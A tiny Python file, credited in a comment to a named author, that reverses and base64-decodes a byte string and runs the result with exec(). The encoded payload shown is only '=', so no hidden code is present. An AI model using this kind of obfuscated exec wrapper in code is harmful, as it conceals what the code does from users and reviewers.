#Tool_made_by_Ajk_rulex_boy_Mohiz
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))
